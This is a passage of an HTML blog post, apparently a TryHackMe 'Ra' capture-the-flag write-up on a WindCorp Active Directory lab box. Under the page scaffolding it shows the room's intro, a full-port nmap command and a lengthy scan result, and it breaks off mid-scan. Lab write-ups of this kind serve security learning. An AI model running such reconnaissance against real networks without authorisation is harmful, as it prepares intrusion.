@@ -1,0 +1,713 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!). Next st">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe-Ra">
+<meta property="og:url" content="http://example.com/2022/10/06/TryHackMe-Ra/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!). Next st">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220708143519611.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220708144408730.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220708150128234.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.885Z">
+<meta property="article:modified_time" content="2022-07-10T05:42:38.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Active Directory">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220708143519611.png">
+  
+  
+  
+  <title>TryHackMe-Ra - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="TryHackMe-Ra"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          31k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          255 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">TryHackMe-Ra</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!).</p>
+<p>Next step would be to take their crown jewels and get full access to their internal network. You have spotted a new windows machine that may lead you to your end goal. Can you conquer this end boss and own their internal network?</p>
+<p>Happy Hacking! </p>
+<p>@4nqr34z and @theart42</p>
+<h6 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Fri Jul  8 14:19:08 2022 as: nmap -sC -sV -T4 -oA Ra -Pn -p- 10.10.121.103</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.121.103<br>Host is up (0.28s latency).<br>Not shown: 65498 filtered tcp ports (no-response)<br>PORT      STATE SERVICE             VERSION<br>53/tcp    open  domain              Simple DNS Plus<br>80/tcp    open  http                Microsoft IIS httpd 10.0<br>|_http-title: Windcorp.<br>|_http-server-header: Microsoft-IIS/10.0<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2022-07-08 06:28:07Z)<br>135/tcp   open  msrpc               Microsoft Windows RPC<br>139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn<br>389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)<br>443/tcp   open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-07-08T06:29:46+00:00; -1s from scanner time.<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title.</span><br><span class="hljs-string">| tls-alpn: </span><br><span class="hljs-string">|_  http/1.1</span><br><span class="hljs-string">| http-auth: </span><br><span class="hljs-string">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="hljs-string">|   Negotiate</span><br><span class="hljs-string">|_  NTLM</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=Windows Admin Center</span><br><span class="hljs-string">| Subject Alternative Name: DNS:WIN-2FAA40QQ70B</span><br><span class="hljs-string">| Not valid before: 2020-04-30T14:41:03</span><br><span class="hljs-string">|_Not valid after:  2020-06-30T14:41:02</span><br><span class="hljs-string">| http-ntlm-info: </span><br><span class="hljs-string">|   Target_Name: WINDCORP</span><br><span class="hljs-string">|   NetBIOS_Domain_Name: WINDCORP</span><br><span class="hljs-string">|   NetBIOS_Computer_Name: FIRE</span><br><span class="hljs-string">|   DNS_Domain_Name: windcorp.thm</span><br><span class="hljs-string">|   DNS_Computer_Name: Fire.windcorp.thm</span><br><span class="hljs-string">|   DNS_Tree_Name: windcorp.thm</span><br><span class="hljs-string">|_  Product_Version: 10.0.17763</span><br><span class="hljs-string">445/tcp   open  microsoft-ds?</span><br><span class="hljs-string">464/tcp   open  kpasswd5?</span><br><span class="hljs-string">593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0</span><br><span class="hljs-string">636/tcp   open  ldapssl?</span><br><span class="hljs-string">2179/tcp  open  vmrdp?</span><br><span class="hljs-string">3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)</span><br><span class="hljs-string">3269/tcp  open  globalcatLDAPssl?</span><br><span class="hljs-string">3389/tcp  open  ms-wbt-server       Microsoft Terminal Services</span><br><span class="hljs-string">|_ssl-date: 2022-07-08T06:29:46+00:00; -1s from scanner time.</span><br><span class="hljs-string">| rdp-ntlm-info: </span><br><span class="hljs-string">|   Target_Name: WINDCORP</span><br><span class="hljs-string">|   NetBIOS_Domain_Name: WINDCORP</span><br><span class="hljs-string">|   NetBIOS_Computer_Name: FIRE</span><br><span class="hljs-string">|   DNS_Domain_Name: windcorp.thm</span><br><span class="hljs-string">|   DNS_Computer_Name: Fire.windcorp.thm</span><br><span class="hljs-string">|   DNS_Tree_Name: windcorp.thm</span><br><span class="hljs-string">|   Product_Version: 10.0.17763</span><br><span class="hljs-string">|_  System_Time: 2022-07-08T06:29:09+00:00</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=Fire.windcorp.thm</span><br><span class="hljs-string">| Not valid before: 2022-07-07T06:19:03</span><br><span class="hljs-string">|_Not valid after:  2023-01-06T06:19:03</span><br><span class="hljs-string">5222/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later</span><br><span class="hljs-string">|_ssl-date: 2022-07-08T06:29:49+00:00; -1s from scanner time.</span><br><span class="hljs-string">| xmpp-info: </span><br><span class="hljs-string">|   STARTTLS Failed</span><br><span class="hljs-string">|   info: </span><br><span class="hljs-string">|     capabilities: </span><br><span class="hljs-string">|     unknown: </span><br><span class="hljs-string">|     errors: </span><br><span class="hljs-string">|       invalid-namespace</span><br><span class="hljs-string">|       (timeout)</span><br><span class="hljs-string">|     stream_id: 4zivxtxln1</span><br><span class="hljs-string">|     auth_mechanisms: </span><br><span class="hljs-string">|     xmpp: </span><br><span class="hljs-string">|       version: 1.0</span><br><span class="hljs-string">|     compression_methods: </span><br><span class="hljs-string">|_    features: </span><br><span class="hljs-string">5223/tcp  open  ssl/hpvirtgrp?</span><br><span class="hljs-string">|_ssl-date: 2022-07-08T06:29:46+00:00; -1s from scanner time.</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=fire.windcorp.thm</span><br><span class="hljs-string">| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm</span><br><span class="hljs-string">| Not valid before: 2020-05-01T08:39:00</span><br><span class="hljs-string">|_Not valid after:  2025-04-30T08:39:00</span><br><span class="hljs-string">5229/tcp  open  jaxflow?</span><br><span class="hljs-string">5262/tcp  open  jabber</span><br><span class="hljs-string">| fingerprint-strings: </span><br><span class="hljs-string">|   RPCCheck: </span><br><span class="hljs-string">|_    &lt;stream:error xmlns:stream=&quot;http://etherx.jabber.org/streams&quot;&gt;&lt;not-well-formed xmlns=&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;</span><br><span class="hljs-string">| xmpp-info: </span><br><span class="hljs-string">|   STARTTLS Failed</span><br><span class="hljs-string">|   info: </span><br><span class="hljs-string">|     capabilities: </span><br><span class="hljs-string">|     unknown: </span><br><span class="hljs-string">|     errors: </span><br><span class="hljs-string">|       invalid-namespace</span><br><span class="hljs-string">|       (timeout)</span><br><span class="hljs-string">|     stream_id: 4fzrryvm4k</span><br><span class="hljs-string">|     auth_mechanisms: </span><br><span class="hljs-string">|     xmpp: </span><br><span class="hljs-string">|       version: 1.0</span><br><span class="hljs-string">|     compression_methods: </span><br><span class="hljs-string">|_    features: </span><br><span class="hljs-string">5263/tcp  open  ssl/unknown</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=fire.windcorp.thm</span><br><span class="hljs-string">| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm</span><br><span class="hljs-string">| Not valid before: 2020-05-01T08:39:00</span><br><span class="hljs-string">|_Not valid after:  2025-04-30T08:39:00</span><br><span class="hljs-string">|_ssl-date: 2022-07-08T06:29:48+00:00; 0s from scanner time.</span><br><span class="hljs-string">5269/tcp  open  xmpp                Wildfire XMPP Client</span><br><span class="hljs-string">| xmpp-info: </span><br><span class="hljs-string">|   STARTTLS Failed</span><br><span class="hljs-string">|   info: </span><br><span class="hljs-string">|     capabilities: </span><br><span class="hljs-string">|     unknown: </span><br><span class="hljs-string">|     features: </span><br><span class="hljs-string">|     errors: </span><br><span class="hljs-string">|       (timeout)</span><br><span class="hljs-string">|     xmpp: </span><br><span class="hljs-string">|     auth_mechanisms: </span><br><span class="hljs-string">|_    compression_methods: </span><br><span class="hljs-string">5270/tcp  open  ssl/xmp?</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=fire.windcorp.thm</span><br><span class="hljs-string">| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm</span><br><span class="hljs-string">| Not valid before: 2020-05-01T08:39:00</span><br><span class="hljs-string">|_Not valid after:  2025-04-30T08:39:00</span><br><span class="hljs-string">|_ssl-date: 2022-07-08T06:29:48+00:00; 0s from scanner time.</span><br><span class="hljs-string">5275/tcp  open  jabber</span><br><span class="hljs-string">| xmpp-info: </span><br><span class="hljs-string">|   STARTTLS Failed</span><br><span class="hljs-string">|   info: </span><br><span class="hljs-string">|     capabilities: </span><br><span class="hljs-string">|     unknown: </span><br><span class="hljs-string">|     errors: </span><br><span class="hljs-string">|       invalid-namespace</span><br><span class="hljs-string">|       (timeout)</span><br><span class="hljs-string">|     stream_id: 346zc75r8d</span><br><span class="hljs-string">|     auth_mechanisms: </span><br><span class="hljs-string">|     xmpp: </span><br><span class="hljs-string">|       version: 1.0</span><br><span class="hljs-string">|     compression_methods: </span><br><span class="hljs-string">|_    features: </span><br><span class="hljs-string">| fingerprint-strings: </span><br><span class="hljs-string">|   RPCCheck: </span><br><span class="hljs-string">|_    &lt;stream:error xmlns:stream=&quot;http://etherx.jabber.org/streams&quot;&gt;&lt;not-well-formed xmlns=&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;</span><br><span class="hljs-string">5276/tcp  open  ssl/unknown</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=fire.windcorp.thm</span><br><span class="hljs-string">| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm</span><br><span class="hljs-string">| Not valid before: 2020-05-01T08:39:00</span><br><span class="hljs-string">|_Not valid after:  2025-04-30T08:39:00</span><br><span class="hljs-string">|_ssl-date: 2022-07-08T06:29:46+00:00; -1s from scanner time.</span><br><span class="hljs-string">5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="hljs-string">|_http-title: Not Found</span><br><span class="hljs-string">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="hljs-string">7070/tcp  open  http                Jetty 9.4.18.v20190429</span><br><span class="hljs-string">|_http-server-header: Jetty(9.4.18.v20190429)</span><br><span class="hljs-string">|_http-title: Openfire HTTP Binding Service</span><br><span class="hljs-string">7443/tcp  open  ssl/http            Jetty 9.4.18.v20190429</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=fire.windcorp.thm</span><br><span class="hljs-string">| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm</span><br><span class="hljs-string">| Not valid before: 2020-05-01T08:39:00</span><br><span class="hljs-string">|_Not valid after:  2025-04-30T08:39:00</span><br><span class="hljs-string">|_http-title: Openfire HTTP Binding Service</span><br><span class="hljs-string">|_http-server-header: Jetty(9.4.18.v20190429)</span><br><span class="hljs-string">7777/tcp  open  socks5              (No authentication; connection not allowed by ruleset)</span><br><span class="hljs-string">| socks-auth-info: </span><br><span class="hljs-string">|_  No authentication</span><br><span class="hljs-string">9090/tcp  open  zeus-admin?</span><br><span class="hljs-string">| fingerprint-strings: </span><br><span class="hljs-string">|   GetRequest: </span><br><span class="hljs-string">|     HTTP/1.1 200 OK</span><br><span class="hljs-string">|     Date: Fri, 08 Jul 2022 06:28:07 GMT</span><br><span class="hljs-string">|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT</span><br><span class="hljs-string">|     Content-Type: text/html</span><br><span class="hljs-string">|     Accept-Ranges: bytes</span><br><span class="hljs-string">|     Content-Length: 115</span><br><span class="hljs-string">|     &lt;html&gt;</span><br><span class="hljs-string">|     &lt;head&gt;&lt;title&gt;&lt;/title&gt;</span><br><span class="hljs-string">|     &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=index.jsp&quot;&gt;</span><br><span class="hljs-string">|     &lt;/head&gt;</span><br><span class="hljs-string">|     &lt;body&gt;</span><br><span class="hljs-string">|     &lt;/body&gt;</span><br><span class="hljs-string">|     &lt;/html&gt;</span><br><span class="hljs-string">|   HTTPOptions: </span><br><span class="hljs-string">|     HTTP/1.1 200 OK</span><br><span class="hljs-string">|     Date: Fri, 08 Jul 2022 06:28:16 GMT</span><br><span class="hljs-string">|     Allow: GET,HEAD,POST,OPTIONS</span><br><span class="hljs-string">|   JavaRMI, drda, ibm-db2-das, informix: </span><br><span class="hljs-string">|     HTTP/1.1 400 Illegal character CNTL=0x0</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 69</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;</span><br><span class="hljs-string">|   SqueezeCenter_CLI: </span><br><span class="hljs-string">|     HTTP/1.1 400 No URI</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 49</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;</span><br><span class="hljs-string">|   WMSRequest: </span><br><span class="hljs-string">|     HTTP/1.1 400 Illegal character CNTL=0x1</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 69</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x1&lt;/pre&gt;</span><br><span class="hljs-string">9091/tcp  open  ssl/xmltec-xmlmail?</span><br><span class="hljs-string">| fingerprint-strings: </span><br><span class="hljs-string">|   DNSStatusRequestTCP, DNSVersionBindReqTCP: </span><br><span class="hljs-string">|     HTTP/1.1 400 Illegal character CNTL=0x0</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 69</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     